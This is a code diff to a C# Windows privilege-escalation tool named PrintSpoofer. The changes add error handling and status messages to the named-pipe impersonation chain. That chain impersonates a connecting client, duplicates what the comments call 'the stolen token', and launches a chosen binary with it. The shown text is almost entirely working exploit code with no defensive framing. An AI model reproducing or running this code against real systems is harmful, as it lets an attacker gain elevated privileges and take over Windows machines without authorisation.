@@ -107,40 +107,72 @@ namespace PrintSpoofer
             IntPtr hPipe = CreateNamedPipe(pipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE | PIPE_WAIT, 10, 0x1000, 0x1000, 0, IntPtr.Zero);
 
             // Connect to our named pipe and wait for another client to connect
-            Console.WriteLine("Waiting for client to connect to named pipe...");
-            bool result = ConnectNamedPipe(hPipe, IntPtr.Zero);
+            Console.WriteLine("[*] Waiting for client to connect to named pipe...");
+
+            if (!ConnectNamedPipe(hPipe, IntPtr.Zero))
+            {
+                Console.WriteLine("[-] ERROR: ConnectNamedPipe failed.");
+                return;
+            }
 
             // Impersonate the token of the incoming connection
-            result = ImpersonateNamedPipeClient(hPipe);
+            if (!ImpersonateNamedPipeClient(hPipe))
+            {
+                Console.WriteLine("[-] ERROR: ImpersonateNamedPipeClient failed.");
+                return;
+            }
 
             // Open a handle on the impersonated token
             IntPtr tokenHandle;
-            result = OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, false, out tokenHandle);
+            if(!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, false, out tokenHandle))
+            {
+                Console.WriteLine("[-] ERROR: OpenThreadToken failed.");
+                return;
+            }
 
             // Duplicate the stolen token
             IntPtr sysToken = IntPtr.Zero;
-            DuplicateTokenEx(tokenHandle, TOKEN_ALL_ACCESS, IntPtr.Zero, SECURITY_IMPERSONATION, TOKEN_PRIMARY, out sysToken);
+            if(!DuplicateTokenEx(tokenHandle, TOKEN_ALL_ACCESS, IntPtr.Zero, SECURITY_IMPERSONATION, TOKEN_PRIMARY, out sysToken))
+            {
+                Console.WriteLine("[-] ERROR: DuplicateTokenEx failed.");
+                return;
+            }
 
             // Create an environment block for the non-interactive session
             IntPtr env = IntPtr.Zero;
-            bool res = CreateEnvironmentBlock(out env, sysToken, false);
+            if(!CreateEnvironmentBlock(out env, sysToken, false))
+            {
+                Console.WriteLine("[-] ERROR: CreateEnvironmentBlock failed.");
+                return;
+            }
 
             // Get the impersonated identity and revert to self to ensure we have impersonation privs
-            String name = WindowsIdentity.GetCurrent().Name;
-            Console.WriteLine($"Impersonated user is: {name}.");
+            string name = WindowsIdentity.GetCurrent().Name;
+            Console.WriteLine($"[+] Impersonated user is: {name}.");
+
+            // Terminate the impersonation begun with the ImpersonateNamedPipeClient call above
             RevertToSelf();
 
             // Get the system directory
             StringBuilder sbSystemDir = new StringBuilder(256);
-            uint res1 = GetSystemDirectory(sbSystemDir, 256);
+            if(GetSystemDirectory(sbSystemDir, 256) == 0)
+            {
+                Console.WriteLine("[-] ERROR: GetSystemDirectory failed.");
+                return;
+            }
 
             // Spawn a new process with the duplicated token, a desktop session, and the created profile
             PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();
             STARTUPINFO sInfo = new STARTUPINFO();
             sInfo.cb = Marshal.SizeOf(sInfo);
             sInfo.lpDesktop = "WinSta0\\Default";
-            CreateProcessWithTokenW(sysToken, LogonFlags.WithProfile, null, binToRun, CreationFlags.UnicodeEnvironment, env, sbSystemDir.ToString(), ref sInfo, out pInfo);
-            Console.WriteLine($"Executed '{binToRun}' with impersonated token!");
+            if( !CreateProcessWithTokenW(sysToken, LogonFlags.WithProfile, null, binToRun, CreationFlags.UnicodeEnvironment,
+                env, sbSystemDir.ToString(), ref sInfo, out pInfo))
+            {
+                Console.WriteLine("[-] ERROR: CreateProcessWithTokenW failed.");
+                return;
+            }
+            Console.WriteLine($"[+] Executed '{binToRun}' with impersonated token!");
         }
     }
 }
